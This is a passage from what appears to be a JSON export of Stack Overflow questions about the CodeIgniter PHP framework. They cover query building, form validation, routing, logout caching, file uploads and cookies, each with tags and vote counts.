AND table1.id = table2.id</code></p>\n\n<p>if ($query->row()->email == $emailv)</p>\n"},{"tags":["mysql","codeigniter","where-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2496,"score":0,"question_id":2822263,"title":"Codeigniter setting multiple where conditions, how to unset one","body":"<p>I've got a script that is a notify_url from paypal that is supposed to update multiple tables in my database using the following code:</p>\n\n<p>//update first table<br>\n$this->db->where('someid', $somid);<br>\n$this->db->update('table', $data);\n<br>\n///update second table\n<br>\n$this->db->where('somesecondid', $somesecondid)<br>\n$this->db->update('anothertable', $data2);<br><br>\nThen I get the following error: Unknown column 'somesecondid' in 'where clause'</p>\n\n<p>UPDATE <code>anothertable</code> SET <code>avail</code> = 0 WHERE <code>someid</code> = '13' AND <code>somesecondid</code> = '199'</p>\n\n<p><br>\nSo codeigniter is combining those where clauses into a single query. Is there a way to unset the first one so it only has \"UPDATE anothertable SET avail=0 WHERE somesecondid = 199\" ? Thanks!</p>\n"},{"tags":["php","codeigniter","client","xml-rpc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13095677,"title":"codeigniter xmlrpc client - how to get the response from an xmlrpc request?","body":"<p>I am using codeigniter to send an xmlrpc request to a wordpress blog. </p>\n\n<p>I can't see in the documentation how to get the response? </p>\n\n<p>I want to to do file uploads, so need to know where the file was. the only way i can see it is by setting the debug var on and it echos out the response... i just want it in an array though</p>\n\n<p>thanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":737,"score":1,"question_id":1753696,"title":"Query in code igniter keeps returning a \"1\"","body":"<p>I am a code igniter noob.  I have a controller like the following:</p>\n\n<pre><code>&lt;?php\nclass Welcome extends Controller {\n    function Welcome()\n    {\n    \tparent::Controller();\t\n    \t$this-&gt;load-&gt;model('usermodel');\n    }\n\n    function index()\n    {\n    \t$res = $this-&gt;db-&gt;get('users');\n    \tdie( print_r($res) );\n    }\n}\n</code></pre>\n\n<p>I have a table 'users' in my database and I have triple checked my database credentials.  However, the print method keeps just printing a \"1\".  Anyone know why this simple query would not work?</p>\n\n<p>Also worth noting that print_r prints out an object and i did set active_record = true in my database.php file. In case it helps, this is the output from  </p>\n\n<pre><code>print_r($this-&gt;db);\n</code></pre>\n\n<p>prints</p>\n\n<pre><code>CI_DB_mysql_driver Object ( [dbdriver] =&gt; mysql [_escape_char] =&gt; ` [delete_hack] =&gt; 1 [_count_string] =&gt; SELECT COUNT(*) AS [_random_keyword] =&gt; RAND() [ar_select] =&gt; Array ( ) [ar_distinct] =&gt; [ar_from] =&gt; Array ( ) [ar_join] =&gt; Array ( ) [ar_where] =&gt; Array ( ) [ar_like] =&gt; Array ( ) [ar_groupby] =&gt; Array ( ) [ar_having] =&gt; Array ( ) [ar_limit] =&gt; [ar_offset] =&gt; [ar_order] =&gt; [ar_orderby] =&gt; Array ( ) [ar_set] =&gt; Array ( ) [ar_wherein] =&gt; Array ( ) [ar_aliased_tables] =&gt; Array ( ) [ar_store_array] =&gt; Array ( ) [ar_caching] =&gt; [ar_cache_exists] =&gt; Array ( ) [ar_cache_select] =&gt; Array ( ) [ar_cache_from] =&gt; Array ( ) [ar_cache_join] =&gt; Array ( ) [ar_cache_where] =&gt; Array ( ) [ar_cache_like] =&gt; Array ( ) [ar_cache_groupby] =&gt; Array ( ) [ar_cache_having] =&gt; Array ( ) [ar_cache_orderby] =&gt; Array ( ) [ar_cache_set] =&gt; Array ( ) [username] =&gt; root [password] =&gt; my_password [hostname] =&gt; localhost [database] =&gt; bhr_development [dbprefix] =&gt; [char_set] =&gt; utf8 [dbcollat] =&gt; utf8_general_ci [autoinit] =&gt; 1 [swap_pre] =&gt; [port] =&gt; [pconnect] =&gt; 1 [conn_id] =&gt; [result_id] =&gt; [db_debug] =&gt; [benchmark] =&gt; 0 [query_count] =&gt; 0 [bind_marker] =&gt; ? [save_queries] =&gt; 1 [queries] =&gt; Array ( [0] =&gt; SELECT * FROM (`users`) ) [query_times] =&gt; Array ( [0] =&gt; 0 ) [data_cache] =&gt; Array ( ) [trans_enabled] =&gt; 1 [trans_strict] =&gt; 1 [_trans_depth] =&gt; 0 [_trans_status] =&gt; [cache_on] =&gt; [cachedir] =&gt; [cache_autodel] =&gt; [CACHE] =&gt; [_protect_identifiers] =&gt; 1 [_reserved_identifiers] =&gt; Array ( [0] =&gt; * ) [stmt_id] =&gt; [curs_id] =&gt; [limit_used] =&gt; ) 1\n</code></pre>\n\n<p><strong>UPDATE</strong>\nI tried something like:</p>\n\n<pre><code>$query = $this-&gt;db-&gt;get(\"users\");\n    \tforeach($query-&gt;result() as $row){\n    \t\techo \"hello\";\n    \t}\n    \tdie();\n</code></pre>\n\n<p>with no luck.  Still get:</p>\n\n<pre><code>Fatal error: Call to a member function result() on a non-object in ...welcome.php...\n</code></pre>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":2,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":1111,"score":0,"question_id":6830627,"title":"CodeIgniter Facebook integration","body":"<p>Is there a Codeigniter library available that allows me to </p>\n\n<ul>\n<li>Login users with their Facebook account</li>\n<li>Import profile data, including interests?</li>\n</ul>\n\n<p><a href=\"http://www.haughin.com/code/facebook/\" rel=\"nofollow\">This library by Elliot Haughin</a> should cover the login part but I'm less sure about importing profile data.</p>\n\n<p>Anyone have information about this?</p>\n"},{"tags":["php","javascript","html","codeigniter","input-validation"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":191,"score":6,"question_id":12963711,"title":"CodeIgniter - PHP Set_Radio on Radio Input","body":"<p>I am working on a website, and I have run into a problem. In order to pre-set or re-input slected values, Codeigniter allows you to use set_radio to solve your problem, seen here:</p>\n\n<pre><code>&lt;td&gt;Do You Have a PayPal Account &lt;span class=\"error\"&gt;*&lt;/span&gt; : &lt;/td&gt;\n&lt;td colspan=\"2\" align=\"left\" valign=\"top\"&gt;&lt;label&gt;   \n  &lt;!-- used for validation --&gt;\n    &lt;input type=\"hidden\" id=\"temp_mid\" value=\"\" /&gt;\n    &lt;input name=\"mail_account\" type=\"radio\" id=\"p_same\" value=\"same\" onclick=\"dohide_show(this.value);\" &lt;?php echo set_radio('mail_account', 'same'); ?&gt;/&gt; Yes(same as email address as above.)&lt;br/&gt;\n    &lt;input name=\"mail_account\" type=\"radio\" id=\"p_diff\" value=\"diff\" onclick=\"dohide_show(this.value);\" &lt;?php echo set_radio('mail_account', 'diff'); ?&gt;/&gt; Yes(different than above.)&lt;br/&gt;\n    &lt;input name=\"mail_account\" type=\"radio\" id=\"p_checkInMail\" value=\"checkInMail\" onclick=\"dohide_show(this.value);\" &lt;?php echo set_radio('mail_account', 'checkInMail'); ?&gt;/&gt; No(I would prefer to receive a check in the mail.)                  \n     &lt;?php echo form_error('mail_account'); ?&gt;           \n\n &lt;/td&gt;\n</code></pre>\n\n<p>This works perfectly fine after validation, as the previous radio button has been selected if there is an error in another part of the form. BUT, when trying to resubmit the page after the user has corrected the error, valditation fails on the radio selection, asking me to click on the radio buttons again, even if the radio button is visually selected on the option I chose before. So I have to choose the radio button again before I can resubmit the form. The alert called is seen here:</p>\n\n<pre><code>function validate_playpal()\n        {   \n            var temp=$('#temp_mid').val();\n            if(temp==\"\")\n            {\n                alert('Please select the PayPal account option.');                  \n                $('#p_same').focus();\n                return false;\n            }\n            if(document.getElementById('p_diff').checked== true &amp;&amp; document.getElementById('paypal_emailid').value=='')\n            {\n                alert('Please provide your PayPal email address.');\n                document.getElementById('paypal_emailid').focus();\n                return false;\n            }\n\n            if(document.getElementById('paypal_emailid').value!='')\n            {\n                if(!email_format(document.getElementById('paypal_emailid').value)){\n                    alert('Please enter valid email address.');\n                    document.getElementById('paypal_emailid').value=\"\";\n                    document.getElementById('paypal_emailid').focus();\n                    return false;               \n                }\n            }\n            return true;\n        }\n</code></pre>\n\n<p>Does anyone know why this isn't working, even though it is repopulating the form correctly? Thanks.</p>\n\n<p>EDIT:</p>\n\n<p>For everyone who asked for what Mid_temp does, it appears to me that it just hides the buttons if they do not need to be selected. In the code I have, these are the only places it is mentioned: </p>\n\n<pre><code>    $('#bx').hide();\nif(document.getElementById('p_diff').checked==true){    \n    $('#bx').show();\n}\n\nfunction dohide_show(val){\n    if(val=='diff')\n    {       \n        $('#bx').show();\n        $('#paypal_emailid').val('');\n        document.getElementById('p_diff').checked=true;\n        $('#temp_mid').val('clicked');\n    }\n    else if(val=='same')\n    {       \n        $('#bx').hide();\n        $('#paypal_emailid').val($('#email_id').val());\n        $('#temp_mid').val('clicked');  \n    }\n    else\n    {\n        $('#bx').hide();\n        $('#paypal_emailid').val($('#email_id').val());\n        $('#temp_mid').val('clicked');\n    }\n\n}\n</code></pre>\n\n<p>and here, in a completely separate file: </p>\n\n<pre><code>function hide_box()\n            {\n                $('#bx').hide();\n                $('#paypal_emailid').val('');\n                $('#temp_mid').val('clicked');\n            }\n            function show_box()\n            {\n                $('#bx').show();\n                $('#paypal_emailid').focus();\n                $('#temp_mid').val('clicked');\n            }\n</code></pre>\n\n<p>Also, Paypal Email ID is just checking the paypal email address that the user put in if they have a paypal account. Thanks for the help everyone.</p>\n"},{"tags":["codeigniter","smarty","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":255,"score":1,"question_id":8767767,"title":"Integrate Smarty and Module Extend in CodeIgniter","body":"<p>I am new with smarty framework. I want to make a project that have integration smarty and module extend(MX) with CodeIgniter.\nI can integrate but not response to what i want.</p>\n\n<p>my result is work only template file in \"ApplicationFolder/ModulesFolder/Views/MyTemplateFile.tpl\" when I run my Controller in my Module. \nBut what I want is it can work in \"ApplicationFolder/Views/MyTemplateFile\" is rather than My Module.</p>\n\n<p>I use $this->parser->parse(\"views/MyTemplateFile.tpl\",$data) in my controller it show empty page.</p>\n\n<p>thank you first for anyone can help me.</p>\n"},{"tags":["php","codeigniter","upload","mime-types"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2236,"score":0,"question_id":9166892,"title":"Upload xls or xlsx files with codeigniter, mime-type error","body":"<p>Well, i believe this is not a Codeigniter problem <em>per se</em> as it is more of a <strong>mime-type</strong>.</p>\n\n<p>I'm trying to upload a file, a xls (or xlsx) file and the mime-type the browser and the php report is <strong>application/octet-stream</strong> instead of <strong>application/excel</strong>, <strong>application/vnd.ms-excel</strong> or <strong>application/msexcel</strong> for a xls file. Of course codeigniter upload plugin will report an error (invalid file type) as it tries to match the file extension with the mime-type.</p>\n\n<p>The weird(est) thing might be that the same code worked for months and now stopped working with the latest Chrome (16.0.912.77), Firefox (10.0) and IE9. </p>\n\n<p>Has anyone had the same (or similar) problem and care to share the solution? </p>\n\n<p>Thank you very much.\nPS: I won't provide code as it's not really a code matter, but if necessary i'll upload some snippets.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>It might be relevant: the error doesn't happen with same browsers on a similar configuration, but with MS Office instead of Libre Office (on my pc). It doesn't happen on a GNU/Linux based + Libre Office system either. SO, could it be Windows playin' hard on the open source suite, or the Libre Office changing the mime-types just for the heck of it?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13084713,"title":"Codeigniter - Handling a form with only one controller for all pages","body":"<p>I started using Codeigniter in a work project, and im still getting the hang of it...</p>\n\n<p>Going around the Codeigniter tutorials i started building the website with only one controller to handle the views, but now i can't handle the form submission on that controller. I'm losing my mind over here... :P</p>\n\n<p>This is the controller's only function (pages.php)</p>\n\n<pre><code>    public function view($page = 'home')\n    {\n\n        if ( ! file_exists('application/views/pages/'.$page.'.php'))\n        {\n            // Whoops, we don't have a page for that!\n            show_404();\n        }\n\n        // handle ACTIVE class\n        $current_page = uri_string();\n\n        $this-&gt;Mp-&gt;isactiveset($this-&gt;session-&gt;userdata('active'),$current_page);\n        $this-&gt;Mp-&gt;newactive($this-&gt;session-&gt;userdata('active'),$current_page);\n\n        // testing database query and passing variables\n        $passar = $this-&gt;Mp-&gt;testedb();\n\n        // get ap types\n        $aptype = $this-&gt;Mp-&gt;getaptype();\n\n        // passing data to view\n        $data['estado'] = $passar; // Testing db connection\n        $data['title'] = ucfirst($page); // Homepage page\n        $data['aptypes'] = $aptype; // Ap types\n\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('pages/'.$page, $data);\n        $this-&gt;load-&gt;view('templates/footer', $data);\n\n    }\n</code></pre>\n\n<p>i have the function to handle the form prepped</p>\n\n<pre><code>    public function index()\n    {\n    $this-&gt;form_validation-&gt;set_rules('nome', 'Username', 'required|min_length[3]|max_length[25]|');\n    $this-&gt;form_validation-&gt;set_rules('telemovel', 'Telephone', 'numeric|exact_length[9]');\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required|valid_email');\n    $this-&gt;form_validation-&gt;set_rules('mensagem', 'MessageBody', 'required|min_length[10]');\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n\n        // handle ACTIVE class\n        $current_page = uri_string();\n\n        $this-&gt;Mp-&gt;isactiveset($this-&gt;session-&gt;userdata('active'),$current_page);\n        $this-&gt;Mp-&gt;newactive($this-&gt;session-&gt;userdata('active'),$current_page);\n\n        // get ap types\n        $aptype = $this-&gt;Mp-&gt;getaptype();\n\n        // testing database query and passing variables\n        $passar = $this-&gt;Mp-&gt;testedb();\n\n        // passing data to view\n        $data['estado'] = $passar; // Testing db connection\n        $data['aptypes'] = $aptype; // Ap types\n\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('pages/home', $data);\n        $this-&gt;load-&gt;view('templates/footer', $data);\n    }\n    else\n    {   \n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('pages/submit', $data);\n        $this-&gt;load-&gt;view('templates/footer', $data);\n    }\n}\n</code></pre>\n\n<p>This is how the route.php looks like (after the first answer i now know this is relevant)</p>\n\n<pre><code>$route['default_controller'] = \"pages/view\";\n$route['(:any)'] = 'pages/view/$1';\n$route['(\\w{2})/(.*)'] = '$2';\n$route['(\\w{2})'] = $route['default_controller'];\n$route['404_override'] = '';\n</code></pre>\n\n<p>On the view, when i do the form_open('submit', $attributes) it just doesn't go inside any function on my controller, except the views. Obviously i have put the form handling function on the pages.php, renamed it times over, tried diferent form submission pages (form_open('pages that i tried', $attributes)). How can i make it go to a specific funtion to handle the form submission?</p>\n\n<p>Help is much needed.</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":42,"score":3,"question_id":13092479,"title":"logout issue in code igniter (PHP)","body":"<p>I am storing loginuserid in session and destroy session  on logout . login and logout work fine but my problem is when user logout and we press back button it still able to open visited page and even when he is actualy loged out . </p>\n\n<p>User go to login page when we refresh the page . I want user not go to visited page even he press back button . Please help me out . Thanks in Advance .</p>\n"},{"tags":["php","codeigniter","baseurl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13084862,"title":"Code Igniter site moved to new server","body":"<p>I hope all of you are having a great week!</p>\n\n<p>I have moved a code ignite site to a new server, When I moved it across I tested it here.</p>\n\n<pre><code>http://31.25.190.77/~freelanc\n</code></pre>\n\n<p>Where it works perfectly, so then I pointed the domain name at it.</p>\n\n<pre><code>http://www.freelanceentrysolutions.co.uk/ \n</code></pre>\n\n<p>but not it doesn't work! Only the homepage works but if I click another link I get</p>\n\n<blockquote>\n  <p>Not Found</p>\n  \n  <p>The requested URL /supply-and-installations.html was not found on this\n  server.</p>\n  \n  <p>Additionally, a 404 Not Found error was encountered while trying to\n  use an ErrorDocument to handle the request.</p>\n</blockquote>\n\n<p>Any ideas here?</p>\n\n<p>Kind Regards, Brad</p>\n\n<p>SOLVED\nI added this to the HTACCESS</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^freelanceentrysolutions\\.co.uk$ [OR]\nRewriteCond %{HTTP_HOST} ^www\\.freelanceentrysolutions\\.co.uk$\nRewriteCond %{REQUEST_URI} !^/index.php/\nRewriteRule (.*) /index.php/$1\n</code></pre>\n"},{"tags":["mysql","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13091318,"title":"Best Practices with thread safe reserved ID in mysql , codeigniter","body":"<p>I'm making a crud with a modal window form . This window is tabbed. Every tab is a related table in 1-n relation with the first tab X.</p>\n\n<p>I need to reserve an id of the X tab to fill these 1-n tables with the FK, and after i've finished to fill these tables, i confirm the record on the X tab.</p>\n\n<p>There are some problems with safeness as i concern:</p>\n\n<p>1)when user A,creating a new row in tab X, is filling the forms,the user B can view the X tab, and B user can see and delete an empty row. I think i've to hide the \"empty\" rows.</p>\n\n<p>2)user A fills the forms, meanwhile blackout,f5,crashes, internet down. I don't want horpans. I've some ugly ideas about this, like night time deletes or timestamps.</p>\n\n<p>How can i avoid these? there is any best practices for these problem?</p>\n\n<p>Using mysql with autoincrement + codeigniter.</p>\n"},{"tags":["php","codeigniter","form-validation","codeigniter-form-helper"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1323,"score":1,"question_id":7820946,"title":"how to create a multi select box with out selected options codeigniter","body":"<p>hi i am using <code>codeigniter</code> , i want to add a <code>multi select box</code> to my page , </p>\n\n<p>i saw the codeigniter user guide example , but what it is doing is set the values in multi select . </p>\n\n<p>like this </p>\n\n<pre><code>$options = array(\n                  'small'  =&gt; 'Small Shirt',\n                  'med'    =&gt; 'Medium Shirt',\n                  'large'   =&gt; 'Large Shirt',\n                  'xlarge' =&gt; 'Extra Large Shirt',\n                );\n\n$shirts_on_sale = array('small', 'large');\n\necho form_dropdown('shirts', $options, $shirts_on_sale);\n</code></pre>\n\n<p>in this multi select box created like this </p>\n\n<pre><code>&lt;select name=\"shirts\" multiple=\"multiple\"&gt;\n&lt;option value=\"small\" selected=\"selected\"&gt;Small Shirt&lt;/option&gt;\n&lt;option value=\"med\"&gt;Medium Shirt&lt;/option&gt;\n&lt;option value=\"large\" selected=\"selected\"&gt;Large Shirt&lt;/option&gt;\n&lt;option value=\"xlarge\"&gt;Extra Large Shirt&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>it have to give the options to be selected in  <code>$shirts_on_sale</code> array , but in my case i want to create a multi select but <code>dont want selected options</code>  i tried to pass an empty array . but it is not working </p>\n\n<p>like this </p>\n\n<pre><code>$array = array();\necho form_dropdown('shirts', $substore_details, $array); \n</code></pre>\n\n<p>how to create a multi select with no selected items . please help..............</p>\n"},{"tags":["codeigniter","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13089868,"title":"Codeigniter custom routing issue","body":"<p>This is my routes setup code</p>\n\n<pre><code>$route['general/(:any)'] = \"videos/filter/$1/1\"; \n$route['general/(:any)/(:num)'] = \"videos/filter/$1/1/$2\"; //pagination\n</code></pre>\n\n<p>Following link works fine.</p>\n\n<pre><code>www.example.com/general/latest \n</code></pre>\n\n<p>But below link doesn't work like what i want</p>\n\n<pre><code>www.example.com/general/latest-trending/5\n</code></pre>\n\n<p>$route['general/(:any)'] only executes always.</p>\n\n<p>How to solve this issue?</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13015571,"title":"CodeIgniter menu/nav dilemma","body":"<p>I'm trying out CodeIgniter and the whole MVC pattern. I have installed <a href=\"http://www.williamsconcepts.com/ci/codeigniter/libraries/template/reference.html\" rel=\"nofollow\">Colin Williams' Template library</a>, but I get stuck when trying to think of the proper way to include two menus/navs: one general (maybe at the top) and one sidebar that is specific for each controller.</p>\n\n<p>Either way, their placements are not relevant, I'm thinking about the general structure of the code. For now I have a function <code>get_menu()</code> in my model and the return from this is given as an argument when loading a partial template view for the sidebar. Or should I do it in the controller?</p>\n\n<p>A buddy of mine gave me advice not to extend the default controller or model with i.e. a <code>MY_Controller</code>, but I don't know when when implementing the general menu? Or should I maybe hardcode this in the template config file?</p>\n\n<p>I can find no guidelines for this type of task. Everywhere I go I find a new solution and many of them are not pretty and the other lot have a lot of duplicated code.</p>\n\n<p><strong>Edit.</strong> I've updated my code. I'm still undecided on how to write the top nav (probably in <code>MY_Controller</code> so that I can highlight the current page).</p>\n\n<p><strong>MY_Controller.php</strong></p>\n\n<pre><code>abstract class MY_Controller extends CI_Controller {\n    protected $_nav;\n\n    const CONTENT_REGION = 'content';\n    const NAV_REGION = 'nav';\n    const TITLE_REGION = 'title';\n\n    const SIDEBAR_NAV_TEMPLATE = 'templates/sidebar_nav';\n\n    public function __construct() {\n        parent::__construct();\n        $this-&gt;_load_nav();\n    }\n\n    abstract protected function _get_nav();\n\n    protected function _load_nav() {\n        $this-&gt;_nav = array('nav' =&gt; $this-&gt;_get_nav());\n    }\n\n    protected function _render() {\n        $args = func_get_args();\n        $n = func_num_args() - 1;\n\n        if ($n &lt; 2) {\n            return;\n        }\n\n        $this-&gt;template-&gt;write(self::TITLE_REGION, $args[0]);\n\n        for ($i = 1; $i &lt; $n; $i++) {\n            $this-&gt;template-&gt;write_view(self::CONTENT_REGION, $args[$i], $args[$n]);\n        }\n\n        $this-&gt;template-&gt;write_view(self::NAV_REGION, self::SIDEBAR_NAV_TEMPLATE, $this-&gt;_nav);\n        $this-&gt;template-&gt;render();\n    }\n\n    protected function _set_active_view($active) {\n        if ($active !== null &amp;&amp; isset($this-&gt;_nav['nav'][$active])) {\n            $this-&gt;_nav['nav'][$active]['class'] .= ' active';\n        }\n    }\n}\n</code></pre>\n\n<p><strong>collection.php</strong></p>\n\n<pre><code>class Collection extends MY_Controller {\n    public function __construct() {\n        parent::__construct();\n        $this-&gt;load-&gt;model('collection_model');\n    }\n\n    protected function _get_nav() {\n        return array(\n            'collection/view' =&gt; array(\n                'href'  =&gt; 'collection/view',\n                'value' =&gt; 'View collection',\n                'class' =&gt; 'icon-film'\n            ),\n            'collection/add' =&gt; array(\n                'href'  =&gt; 'collection/add',\n                'value' =&gt; 'Add title',\n                'class' =&gt; 'icon-plus-sign'\n            )\n        );\n    }\n\n    public function index() {\n        $this-&gt;view();\n    }\n\n    public function view() {\n        $data['list'] = $this-&gt;collection_model-&gt;get_list();\n        $this-&gt;_set_active_view('collection/view');\n        $this-&gt;_render('View Collection', 'collection/view', $data);\n    }\n}\n</code></pre>\n\n<p><strong>sidebar_nav.php</strong></p>\n\n<pre><code>&lt;ul class=\"nav nav-list bs-docs-sidenav\"&gt;\n    &lt;?php\n\n    foreach ($nav as $item) {\n        echo '&lt;li';\n\n        if ($item['class'] !== null || $item['class'] !== '') {\n            echo ' class=\"' . $item['class'] . '\"';\n        }\n\n        echo '&gt;&lt;a href=\"' . $item['href'] . '\"&gt;' . $item['value'] . '&lt;/a&gt;&lt;/li&gt;';\n    }\n\n    ?&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>How does this look? I might write a function <code>_render($title, $view, $data)</code> in <code>MY_Controller</code> that does all the template stuff. What do you think?</p>\n\n<p>Another solution I've been thinking about is to remove <code>_get_nav()</code> and load the needed nav data from a config file, but I don't know how to do this.</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":2190,"score":1,"question_id":5544891,"title":"logout feature in code igniter","body":"<p>I started using codeigniter for my project. I have user authentication system for my website. I have seen the videos from nettuts for the login information. I am confused why the logout is not working properly. </p>\n\n<p>I have the following logout function in my login controller.</p>\n\n<pre><code>function logout() {\n        $this-&gt;session-&gt;sess_destroy();\n        redirect('main');\n    }\n</code></pre>\n\n<p>If I click on the logout button I am redirecting the user to the main page. But after redirecting the user to the main page, if click on the back button on the browser I will see the logoff and my name on the top of the page. I need some help on where I am going wrong or is there any important piece of code I am missing in my controller</p>\n\n<p>Thanks in advance</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I think I found the solution. I should append the following code into the appropriate controller</p>\n\n<pre><code>$this-&gt;output-&gt;set_header(\"Cache-Control: no-store, no-cache, must-revalidate, no-transform, max-age=0, post-check=0, pre-check=0\");\n$this-&gt;output-&gt;set_header(\"Pragma: no-cache\"); \n</code></pre>\n"},{"tags":["codeigniter","facebook-graph-api","opengraph"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13084062,"title":"How to get Facebook user detail from Access Token using Codeigniter?","body":"<p>I'm really struggling to understand what's happening here. I can get a Users details fine  in the OpenGraph tester or just hitting the URL <a href=\"https://graph.facebook.com/me?access_token=VALID_TOKEN\" rel=\"nofollow\">https://graph.facebook.com/me?access_token=VALID_TOKEN</a> or using file_get_contents, but when trying the Codeigniter Facebook Library I get error <em>\"An active access token must be used...\"</em> and if I just try a CURL GET I get no output. I know the access_token is valid so why aren't they working? The overall objective is to get an access_token from iOS App and use this to do a Like via the web server using og.likes.</p>\n\n<p><strong>My test function:</strong></p>\n\n<pre><code>function me_test(){\n    $access_token = \"VALID_TOKEN\";\n    $url = 'https://graph.facebook.com/me?access_token=';\n    $url_full = $url.$access_token;\n\n    $result = file_get_contents($url_full);\n    echo $result;\n\n    // Try Codeigniter Facebook Library\n    try {\n        $user = $this-&gt;facebook-&gt;api('/me?access_token='.$access_token);\n    } catch (Exception $e) {\n        print_r($e);\n    }\n\n    // Codeigniter CURL Library\n    $this-&gt;load-&gt;library('curl');  \n    echo $this-&gt;curl-&gt;simple_get($url_full);\n    $info =  $this-&gt;curl-&gt;info;\n    print_r($info);\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","image-manipulation"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":717,"score":1,"question_id":7060086,"title":"Problems creating image thumbnails with CodeIgniter","body":"<p>I'm trying to use the image manipulation class to create thumbnails of images. Here's my relevant method:</p>\n\n<pre><code>public function create_thumbnail($source_img, $name, $file_ext)\n{\n    $config['image_library'] = 'gd2';\n    $config['source_image'] = $source_img;\n    $config['create_thumb'] = TRUE;\n    $config['maintain_ratio'] = TRUE;\n    $config['width'] = 50;\n    $config['new_image'] = 'C:\\xampp\\htdocs\\\\' .  $name . 't' . $file_ext;\n\n    $this-&gt;load-&gt;library('image_lib', $config);\n    if(!$this-&gt;image_lib-&gt;resize())\n    {\n        echo $this-&gt;image_lib-&gt;display_errors();exit;\n    }\n    return TRUE;\n}\n</code></pre>\n\n<p>When the script is run, I get this error:</p>\n\n<pre><code>Unable to save the image. Please make sure the image and file directory are writable.\n</code></pre>\n\n<p>The array element <code>$config['new_image']</code> evaluates to something like this: <code>C:\\xampp\\htdocs\\EuzIDct.jpg</code>, so I know it's not that. The source file also exists at the time the method is called, so it's not that either.</p>\n\n<p>Does anyone have any clue what's going on here? I Google'd the problem but the solution from the CI forums is saying specify an absolute path nor a relative one, which is what I'm doing but alas it doesn't work.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","codeigniter","config"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13048315,"title":"Codeigniter - how do I update my database config settings dynamically?","body":"<p>I want to change some database settings for one part of my program.</p>\n\n<p>In my setup the databse class is autoloaded with a config which looks like this</p>\n\n<pre><code>$db['default']['hostname'] = 'localhost';\n$db['default']['username'] = 'root';\n$db['default']['password'] = '****';\n$db['default']['database'] = 'database';\n$db['default']['dbdriver'] = 'mysql';\n$db['default']['dbprefix'] = '';\n$db['default']['pconnect'] = TRUE;\n$db['default']['db_debug'] = TRUE;\n$db['default']['cache_on'] = FALSE;\n$db['default']['cachedir'] = '';\n$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_general_ci';\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = FALSE;\n</code></pre>\n\n<p>At one part of the script I want to change the value of <code>$db['default']['keyname']</code> , how can I do this?</p>\n"},{"tags":["php","codeigniter","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13084512,"title":"Codeigniter cookie won't set","body":"<p>For some reason I cannot set a cookie with an simple example. Every example I found on web failed too. I wonder if I miss something little. Keeps saying \"<em>Cookie not set</em>\"</p>\n\n<p>I added <em>REFRESH</em> after setting cookie and another method *get_language()* to read it via link clicking but still no luck.</p>\n\n<p>Thanks in advance</p>\n\n<p><strong>VIEW</strong></p>\n\n<pre><code>   &lt;p&gt;\n    &lt;a href=\"&lt;?php echo site_url('welcome/set_language/english'); ?&gt;\"&gt;English&lt;/a&gt;\n    &lt;br /&gt;\n    &lt;a href=\"&lt;?php echo site_url('welcome/set_language/spanish'); ?&gt;\"&gt;Spanish&lt;/a&gt;\n    &lt;/p&gt;\n\n    &lt;br /&gt;\n    &lt;p&gt;&lt;a href=\"&lt;?php echo site_url('welcome/get_language'); ?&gt;\"&gt;Get Language&lt;/a&gt;&lt;/p&gt;\n</code></pre>\n\n<p><strong>CONTROLLER</strong></p>\n\n<pre><code>class Welcome extends CI_Controller\n{\n    var $cookie_name    = 'language';\n\n    public function __construct()\n    {\n        parent::__construct();\n\n        $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;helper('cookie');\n    }\n\n    public function index()\n    {\n        $this-&gt;load-&gt;view('welcome_message');\n    }\n\n    public function set_language()\n    {\n        if($this-&gt;uri-&gt;segment(3) != false)\n        {\n           